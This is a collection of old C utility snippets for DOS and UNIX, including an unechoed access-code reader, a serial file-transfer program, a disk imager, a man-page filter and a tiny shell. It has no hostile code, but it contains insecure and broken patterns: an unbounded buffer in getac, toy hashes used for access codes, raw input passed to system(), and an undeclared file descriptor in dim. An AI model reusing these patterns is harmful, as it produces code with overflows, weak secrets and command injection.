# define  ACNOK		write (2, "Drop Dead ! Get Lost !\n", 23) ; \
			exit (31)

# endif   /* DOS */

int main () {

# include "ac.c"

}

/*_______________________________________________________________________
 *_____	getac + get access code ... _____________________________________
 */

# ifdef   DOS

# include <conio.h>
# include <string.h>

# else    /* UNIXENIX */

# include <sys/types.h>
# include <termio.h>
# include <sys/ioctl.h>

# endif   /* DOS */

char * getac (prompt) char * prompt ; {

	static char acb [20] ;
	register char * acp = acb ;

/* # define  LAZY	*/				/* 4 those hurry days	*/

# ifdef   LAZY

	strcpy ( acp , getpass (prompt) ) ;

	return ( acp ) ;

# else    /* PRO */

# ifdef   UNIXENIX

	register char * pp = prompt ;
	register int tfd = open ("/dev/tty", 2) ;
	struct termio ots, wts ;

	ioctl (tfd, TCGETS, &ots) ;
	wts = ots ;
	wts.c_lflag &= ~ (ECHO | ICANON) ;
	wts.c_cc [VMIN] = 1 ;
	ioctl (tfd, TCSETS, &wts) ;

	while (*pp)
		++pp ;

	write (tfd, prompt, pp - prompt) ;

# else    /* DOS */

	cputs (prompt) ;

# endif   /* UNIXENIX */


	for ( ; ; ) {

# ifdef   UNIXENIX

		read (tfd, acp, 1) ;

# else    /* DOS */

		*acp = getch () ;

# endif   /* UNIXENIX */

		if (*acp == '\r')
			*acp = '\n' ;
		if (*acp == '\n')
			break ;
		if (*acp == '\b') {
			if (acp - acb)
				--acp ;
		} else
			++acp ;
	}

# ifdef   UNIXENIX

	write (tfd, acp, 1) ;
	ioctl (tfd, TCSETS, &ots) ;
	close (tfd) ;

# else    /* DOS */

	putch ('\r') ; putch ('\n') ;

# endif   /* UNIXENIX */

	*acp = '\0' ;
	return (acb) ;

# endif   /* LAZY */

}

/*	____	____	____	____	____	____	____	____	*/

/* nocr.c */

# include <stdio.h>

main () {

	int x ;

	while ((x = getchar ()) != EOF)
		if (x != '\r')
			putchar (x) ;
}

/*	____	____	____	____	____	____	____	____	*/

/* tcolor.c */

# include	<stdio.h>

# define	USE_STDCOLOR

# include	"abc.h"

main () {

	simple () ;

	abxstd () ;

}

simple () {

	int x, y ;

	for ( x = 0 ; x < 8 /* 16 */ ; ++x ) {
		for ( y = 0 ; y < 8 ; ++y ) {
			printf ("\033[=%dF\033[=%dG%02d/%02d ", x, y, x, y) ;
		}
		printf ("\n") ;
	}
}

abxstd () {

	int x, y ;
	char tb [200] ;

	terminit () ;
	initcolor () ;

	colorvideo (_LIGHTGRAY, _BLUE) ;
	strout ("-------------------------------------------------------\n\r", 0) ;

	for ( x = 0 ; x < 16 ; ++x ) {
		colorvideo (x+1, _BLACK) ;
		sprintf (tb, "%d = %s \n\r", x, _COLORNAME(x)) ;
		strout (tb, 0) ;
	}

	colorvideo (_LIGHTGRAY, _BLUE) ;
	strout ("-------------------------------------------------------\n\r", 0) ;

	for ( x = 0 ; x < 8 /* 16 */ ; ++x ) {
		for ( y = 0 ; y < 8 ; ++y ) {
			colorvideo (x, y) ;
			sprintf (tb, "%02d/%02d ", x, y) ;
			strout (tb, 0) ;
		}
		strout ("\r\n", 2) ;
	}

# ifdef SILLY

	colorvideo (_LIGHTGRAY, _BLUE) ;
	strout ("-------------------------------------------------------\n\r", 0) ;

	for ( x = 0 ; x < 16 ; ++x ) {
		y = _COLOR(x) ;
		colorvideo (y, _BLACK) ;
		sprintf (tb, "_C(%d) = %d = %s \n\r", x, y, _COLORNAME(y)) ;
		strout (tb, 0) ;
	}

# endif

	colorvideo (_LIGHTGRAY, _BLUE) ;
	strout ("-------------------------------------------------------\n\r", 0) ;

 	termend () ;
}

/*	____	____	____	____	____	____	____	____	*/

/* mok.c -- manual ok (dumb term / no nroff emu) */

# include <stdio.h>
# include <ctype.h>

# define	TRUE	-1
# define	FALSE	 0

int mflag = 0 ;
int boldcount = 0 ;
int boldsize = 4 ;

main (argc, argv) char * * argv ; {

	char ibuf [1024] , obuf [1024] ;
	register char * ip , * op ;
	register int inbold = FALSE ;
	int lastbold , tmp ;

	if (--argc) {
		while (*++argv) {
			if (**argv == '-') {
				switch ( *((*argv)+1) ) {
					case '-' : /* stdin ... ; */ break ;

					case 'm' : ++mflag ; break ;

					case '?' :
					default  :
						printf ("mok [-?m]\n") ;
						return ;
				}
			} else { /* free parm ... pick or proc ? */
				/* workon (*argv) ; */
			}
		}
	} else {
		/* no-parms @ all ... */
	}

	while (fgets (ibuf, 1024, stdin)) {
		ip = ibuf ;
		op = obuf ;

		while (*ip) {
			switch (*ip) {

				case '\b' :
					if (inbold) {
					} else {
						inbold = TRUE ;
						lastbold = *(ip-1) ;
						if (mflag) {
							tmp = *(op-1) ;
							*(op-1) = '@' ;
							*op++ = tmp ;
						}
					}
					++ip ;
				break ;

				case '_' :
					if ( *(ip+1) == '\b' )
						if ( *(ip+2) != '_' ) {
							ip += 2 ;
							continue ;
						}
				/* break ; */

				default :
					if (isspace (*ip)) {
						if (inbold) {
							inbold = FALSE ;
							lastbold = '\0' ;
							if (mflag)
								*op++ = '@' ;
							boldcount = 0 ;
						}
						*op++ = *ip++ ;
					} else {
						if (inbold) {
							if (*ip == lastbold && boldcount++ < boldsize) {
								++ip ;
							} else {
								boldcount = 0 ;
								if ( *(ip+1) == '\b' ) {
									*op++ = lastbold = *ip++ ;
								} else {
									inbold = FALSE ;
									lastbold = '\0' ;
									if (mflag)
										*op++ = '@' ;
									*op++ = *ip++ ;
								}
							}
						} else {
							*op++ = *ip++ ;
						}
					}
				break ;
			}
		}

		*op++ = '\0' ;
		fputs (obuf, stdout) ;
	}
}

/*	____	____	____	____	____	____	____	____	*/

# include "abc.h"

BYTE * memocopy (dst, src, cnt) BYTE * dst , * src ; {

	register ULONG * slp , * dlp ;
	register BYTE  * sbp , * dbp ;
	register int lk , bk ;

	lk = cnt >> 2 ;
	bk = cnt % 4 ;

	slp = (ULONG *) src ;
	dlp = (ULONG *) dst ;

	while (lk--)
		*dlp++ = *slp++ ;

	sbp = (BYTE *) slp ;
	dbp = (BYTE *) dlp ;

	while (bk--)
		*dbp++ = *sbp++ ;

	return dst ;
}

/*_______________________________________________________________________
 *	 strppr + encode w/ pepper ...
 */

# include "abc.h"

ULONG strppr (buf) char * buf ; {

	REG char * bp = buf ;
	REG ULONG cod = 0x5aa5aa55L ;
	REG int bk = 1 ;

	while (*bp)
		cod ^= (*bp++ * bk++) ;

	return (cod) ;
}

/*_______________________________________________________________________
 *	 pepper + ...
 */

# include <stdio.h>

# include "abc.h"

int main () {

	REG char * bp ;
	REG char * tp = "*" ;
	REG ULONG ulppr ;
	REG ULONG ulcod ;
	REG BYT bppr = 0xa5 ;

	for ( ; *tp ; ) {
	
			for ( tp = bp = getac ("# ") ; *bp ; bppr ^= *bp++ )
			;		

		ulcod = strcod (tp) ;
		ulppr = strppr (tp) ;

		printf ("b 0x%04x 0%04o %u %d\n", bppr, bppr, bppr, bppr) ;

		printf ("c 0x%08lx 0%08lo %lu %ld\n",
			ulcod, ulcod, ulcod, ulcod) ;

		printf ("p 0x%08lx 0%08lo %lu %ld\n",
			ulppr, ulppr, ulppr, ulppr) ;
	}

}

/*	____	____	____	____	____	____	____	____	*/

/* dim (disk image) */

# include <io.h>
# include <dos.h>
# include <stdio.h>
# include <stdlib.h>

char buf [16384] ;

int main (argc, argv) char * * argv ; {

	char * np = *(argv+2) ;
	int drv = (*(*(argv+1))) - 'A' ;
	int trk = atoi ( *(argv+3) ) ;
	int sek ;
	FILE * fp ;

	if (argc != 4) {
		printf ("dim DriveLetter FileName SectorsPerTrack\n") ;
		return ;
	}

	fp = fopen (np, "wb") ;

	for ( sek = 0 ; ; sek += trk ) {
		if ( absread (drv, trk, sek, buf) )
			break ;
		write (fd, buf, 512 * trk) ;
		printf ("sector # %d\r", sek) ;
	}

	close (fd) ;
}

/*	____	____	____	____	____	____	____	____	*/

/*	(old serial) xft  [-vd]  -p  port  -sr  name		*/

# include <sys/types.h>
# include <termio.h>
# include <fcntl.h>
# include <stdio.h>
# include <signal.h>

# define  ACK		'\006'
# define  ETX		'\003'

# define  SACK		"\006"
# define  SNAK		"\025"

# define  MADFLG	"%s: mad flag '-%c'\n"
# define  USAGE		"\nuse:\t%s [-v] -p port -sr name\n\n"
# define  NOPORT	"%s: can't access port %s\n"
# define  BADNAM	"%s: can't access file %s\n"
# define  CANCEL	"%s: %s traped\n"

# define  IFLAGS	(BRKINT | IGNPAR | ISTRIP | IGNCR | ICRNL)
# define  OFLAGS	(OCRNL)
# define  CFLAGS	(B9600 | CS8 | CSTOPB | CREAD | CLOCAL)
# define  LFLAGS	(ISIG | ASCII)

int cfd, verb = 0, dbug = 0, rwob = 0, byk = 0, flag ;
char * what = "?", * port = NULL , * name = NULL, * swid = "xft" ;
FILE * tfp ;
struct termio currst, workst ;

int trapint () ;

main (argc, argv) char * * argv ; {

	signal (SIGINT, trapint) ;

	while (*++argv)
		if (**argv == '-')
			switch ( flag = *((*argv)+1) ) {

				case 'v' : verb = 1 ; break ;

				case 'd' : dbug = 1 ; break ;

				case 'p' : port = *++argv ; break ;

				case 's' :
					*what = 'r' ;
					name = *++argv ;
				break ;

				case 'r' :
					*what = 'w' ;
					name = *++argv ;
				break ;

				default : crap (MADFLG, flag) ; break ;
			}
	if (! (name && port))
		crap (USAGE, swid) ;

	if ((cfd = open (port, 2)) < 0)
		crap (NOPORT, port) ;

	if ((tfp = fopen (name, what)) < 0)
		crap (BADNAM, name) ;

	xft () ;
}

xft () {

	sup () ;

	if (*what == 'w')
		rcv () ;
	else
		xmt () ;

	rip () ;
}

sup () {

	ioctl (cfd, TCGETS, &currst) ;
	workst = currst ;

	workst.c_iflag = (IFLAGS) ;
	workst.c_oflag = (OFLAGS) ;
	workst.c_cflag = (CFLAGS) ;
	workst.c_lflag = (LFLAGS) ;
	workst.c_cc[VMIN] = 1 ;
	workst.c_cc[VPAGE] = 0 ;

	ioctl (cfd, TCSETS, &workst) ;
}

xmt () {
	register int byt ;

	while ((byt = fgetc (tfp)) != EOF) {
		++byk ;
		xmtbyt (byt) ;
	}
	xmtbyt (ETX) ;
}

xmtbyt (b) {
	char y, x = b & 0xff ;

	while (write (cfd, &x, 1) != 1)
		iodbg (x, "XB~") ;
	iodbg (x, "XB+") ;

	while (read (cfd, &y, 1) != 1)
		iodbg (y, "RE~") ;
	iodbg (y, "RE+") ;

	if (x != y) {
		while (write (cfd, SNAK, 1) != 1)
			iodbg (y, "XN~") ;
		iodbg (y, "XN+") ;
	} else {
		while (write (cfd, SACK, 1) != 1)
			iodbg (x, "XA~") ;
		iodbg (x, "XA+") ;
	}
}

rcv () {
	register int byt ;

	for ( ++byk ; (byt = rcvbyt ()) != ETX ; ++byk )
		fputc (byt, tfp) ;
}

rcvbyt () {
	char k, x ;

	do {
		while (read (cfd, &x, 1) != 1)
			iodbg (x, "RB~") ;
		iodbg (x, "RB+") ;

		while (write (cfd, &x, 1) != 1)
			iodbg (x, "XE~") ;
		iodbg (x, "XE+") ;

		while (read (cfd, &k, 1) != 1)
			iodbg (x, "RA~") ;
		iodbg (x, "RA+") ;

	} while (k != ACK) ;

	return (x) ;
}

trapint () {

	if (verb)
		crap (CANCEL, "SigINT") ;
	rip () ;
}

crap (msg, dat) char * msg, * dat ; {

	fprintf (stderr, msg, swid, dat) ;
	rip () ;
}

iodbg (v, s) char * s ; {

	if (! dbug)
		return ;
	fprintf (stderr, "#%5d '%02x' %3s ", byk, v, s) ;
	fflush (stderr) ;
}

rip () {

	ioctl (cfd, TCSETS, &currst) ;
	close (cfd) ; fclose (tfp) ;
	exit (31) ;
}

/*_______________________________________________________________________
 *______xw + exec with (list, command)___________________________________
 */

# include <stdio.h>
# include <stdlib.h>

main (argc, argv) char * * argv ; {
	char nam [ 100 ] ;
	char cmd [ 200 ] ;
	register char * tp ;
	register char * np ;
	register char * cp ;

	while (fgets (nam, 80, stdin)) {
		for ( cp = cmd , tp = *(argv+1) ; *tp ; ++tp ) {
			if (*tp == '=') {
				for ( np = nam ; *np ; ++np )
					*cp++ = *np ;
			} else {
				*cp++ = *tp ;
			}
		}
		*cp++ = '\0' ;
		fprintf (stderr, "+ %s\n", cmd) ;
		system (cmd) ;
	}
}

/*	____	____	____	____	____	____	____	____	*/

/* ash.c -- a shell ... */

# include <stdio.h>

char cmd [128] ;
char prompt [128] = "@ " ;
char tmpbuf [128] ;

main () {

	ash () ;
}

ash () {

	getcwd (tmpbuf, 128) ;
	sprintf (prompt, "%s @ ", tmpbuf) ;

	for ( ; ; ) {

		printf ("%s", prompt) ;

		if ( fgets (cmd, 128, stdin) == NULL )
			break ;

		if ( strncmp (cmd, "cd", 2) == 0 ) {
			if ( cmd[2] == '\0' )
				strcpy (tmpbuf, getenv ("HOME") ) ;
			else if ( cmd[2] == ' ' )
				strcpy (tmpbuf, cmd+3) ;
			else
				continue ;
			if ( chdir (tmpbuf) )
				printf ("ash: can't chdir to %s\n", tmpbuf) ;
			getcwd (tmpbuf, 128) ;
			sprintf (prompt, "%s @ ", tmpbuf) ;
			continue ;
		}
		system (cmd) ;
	}
}

/*	____	____	____	____	____	____	____	____	*/

/* strank by bud a.r.r.w.f. */

# include "abc.h"

int strank (buf) char * buf ; {
	REG char * * sp = &buf ; 
	REG char *   bp = buf ;
	REG char *   tp ;

	for ( ++sp ; *sp ; ++sp )
		for ( tp = *sp ; *tp ; *bp++ = *tp++ )
			;
	*bp = NUL ;
	return (bp - buf) ;
}

/*_______________________________________________________________________
 *	 strcod + encode ...
 */

# include "abc.h"

ULONG strcod (buf) char * buf ; {

	REG char * bp = buf ;
	REG ULONG cod = 0 ;
	REG int bk = 1 ;

	while (*bp)
		cod += (*bp++ * bk++) ;
	return (cod) ;
}

/*	____	____	____	____	____	____	____	____	*/

# endif /* COMMENT */

/*
 * vi:nu ts=4
 */
